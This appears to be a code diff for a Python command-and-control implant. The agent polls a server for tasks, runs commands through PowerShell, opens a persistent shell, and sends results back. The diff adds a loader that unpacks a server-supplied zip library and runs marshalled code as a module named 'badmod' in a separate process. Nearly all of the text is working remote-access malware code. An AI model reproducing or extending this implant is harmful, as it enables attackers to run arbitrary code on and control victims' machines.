@@ -4,7 +4,17 @@ import getpass
 import platform
 import threading
 import subprocess
+import types
+import marshal
 import time
+import tempfile
+import sys
+import io
+import os
+import zipfile
+from multiprocessing import Process, Pipe, set_start_method, freeze_support
+
+
 
 BASE_URL = "http://127.0.0.1"
 HEARTBEAT = 5
@@ -14,11 +24,11 @@ class Request:
         self.method = None
         self.headers = {}
         self.params = {}
-        self.data = ""
-        self.header_separator = "||" 
-        self.header = ""
-        self.task_id = ""
-        self.url = ""
+        self.data = b""
+        self.header_separator = b"||" 
+        self.header = b""
+        self.task_id = b""
+        self.url = b""
     
     def set_response(self, req):
         self.data = req.content
@@ -35,23 +45,23 @@ class Request:
     def add_param(self, key, value):
         self.params[key] = value
 
-    def set_task_id(self, task_id, binary=False):
-        self.task_id = task_id if binary else task_id.decode() if isinstance(task_id, bytes) else task_id
+    def set_task_id(self, task_id):
+        self.task_id = task_id if isinstance(task_id, bytes) else task_id.encode()
 
-    def set_data(self, data, binary=False):
-        self.data = data if binary else data.decode() if isinstance(data, bytes) else data
+    def set_data(self, data):
+        self.data = data if isinstance(data, bytes) else data.encode()
 
     def set_header_separator(self, separator):
-        self.header_separator = separator if isinstance(separator, str) else separator.decode()
+        self.header_separator = separator if isinstance(separator, bytes) else separator.encode()
 
     def set_header(self, header):
-        self.header = header if isinstance(header, str) else header.decode()
+        self.header = header if isinstance(header, bytes) else header.encode()
 
     def send(self):
         if not self.method or not self.url:
             raise ValueError("Method and URL must be set before sending the request")
 
-        parts = ["", "", ""]
+        parts = [b"", b"", b""]
 
         if self.header:
             parts[0] = self.header
@@ -65,7 +75,7 @@ class Request:
         if self.method == 'GET':
             response = requests.get(self.url, headers=self.headers, params=self.params)
         elif self.method == 'POST':
-            response = requests.post(self.url, headers=self.headers, data=payload.encode())
+            response = requests.post(self.url, headers=self.headers, data=payload)
         else:
             raise ValueError("Unsupported method. Use 'GET' or 'POST'")
 
@@ -74,7 +84,7 @@ class Request:
     def recv(self, binary=False):
         
         if isinstance(self.data, str):
-            raw_data = self.data.encode()
+            raw_data = self.data
         else:
             raw_data = self.data
 
@@ -82,7 +92,7 @@ class Request:
         task_id = b""
         data = b""
 
-        parts = raw_data.split(self.header_separator.encode(), 2)
+        parts = raw_data.split(self.header_separator, 2)
         
         if len(parts) == 3:
             header, task_id, data = parts
@@ -106,7 +116,6 @@ def request(
     header_separator=None, 
     headers=None,
     params=None,
-    binary=False
 ):
     try:
         r = Request()
@@ -121,7 +130,7 @@ def request(
         if header:
             r.set_header(header)
         if data:
-            r.set_data(data, binary)
+            r.set_data(data)
         if headers:
             for key, value in headers.items():
                 r.add_header(key, value)
@@ -152,10 +161,10 @@ def auth():
     
 def get_command(agent_id):
     response = request("GET", f"{BASE_URL}/task",params={"X-Agent-Id": agent_id})
-    return parse_response(response)
+    return parse_response(response,True)
     
-def send_result(agent_id, task_id, result):
-    response = request("POST", f"{BASE_URL}/result", headers={"X-Agent-Id": agent_id}, task_id=task_id, data=result)
+def send_result(agent_id, task_id, result, header):
+    response = request("POST", f"{BASE_URL}/result", headers={"X-Agent-Id": agent_id}, task_id=task_id, data=result, header=header)
     
     _, _, data =  parse_response(response)
 
@@ -221,8 +230,6 @@ class PersistentShell:
         with self.lock:
             return self.output
 
-
-
 def execute(cmd) -> str:
     try:
         result = subprocess.check_output(['powershell','-c',cmd],shell=True, stderr=subprocess.STDOUT)
@@ -262,17 +269,53 @@ def shell(agent_id):
         send_result(agent_id, task_id, response)
         
     return ""
+
+def unzip_library(zip_path, extract_to):
+    os.makedirs(extract_to, exist_ok=True)
+    with zipfile.ZipFile(io.BytesIO(zip_path), 'r') as zipf:
+        zipf.extractall(extract_to)
+
+    if os.path.isdir(zip_path):
+        os.remove(zip_path)
+
+def run_module(lib, module, temp_dir, conn):
+
+        unzip_library(lib, f"{temp_dir}/lib")
         
-def execute_module(module):
+        code_obj = marshal.loads(module)
+        mod_name = 'badmod'
+        mod = types.ModuleType(mod_name)
+        
+        sys.path.insert(0, f"{temp_dir}/lib")
+        exec(code_obj, mod.__dict__)
+        if hasattr(mod, 'main'):
+            result = mod.main()
+            conn.send(result)
+            
+        else:
+            conn.send(("", f"No entry-point 'main' in module {mod_name}"))
+        conn.close()
+            
+def execute_module(data):
+    parts = data.split(b"::::")
+    lib = parts[0]
+    module = parts[1]
 
-    namespace = {}
-    
-    obj = compile(module, "<string>", "exec")
-    exec(obj, namespace)
-
-    response = namespace['result']
-    return response
-
+    with tempfile.TemporaryDirectory() as temp_dir:
+        
+        parent_conn, child_conn = Pipe()
+        p = Process(target=run_module, args=(lib, module, temp_dir, child_conn))
+        p.start()
+        if parent_conn.poll(10):
+            result = parent_conn.recv()
+        else:
+            result = ("", "Timeout waiting for module result")
+        p.join(timeout=10)
+        if p.is_alive():
+            p.terminate()
+            p.join()
+            
+        return result
 
 def main():
 
@@ -284,14 +327,14 @@ def main():
         header, task_id, cmd = get_command(agent_id)
         
         if header:
-            match header:
+            match header.decode():
                 case "CMD":
-                    response = execute(cmd)
+                    response = execute(cmd.decode())
                 case "SHELL":
-                    send_result(agent_id, task_id, "Spawned")
+                    send_result(agent_id, task_id.decode(), "Spawned")
                     response = shell(agent_id)
                 case "MODULE":
-                    response = execute_module(cmd)
+                    header, response = execute_module(cmd)
                 case _:
                     pass
         else:
@@ -299,8 +342,10 @@ def main():
 
         if not response:
             response = "\n"
-        send_result(agent_id, task_id, response)
-            
+    
+        send_result(agent_id, task_id.decode(), response, header)       
         
 if __name__ == "__main__":
+    freeze_support()
+    set_start_method("spawn")
     main()
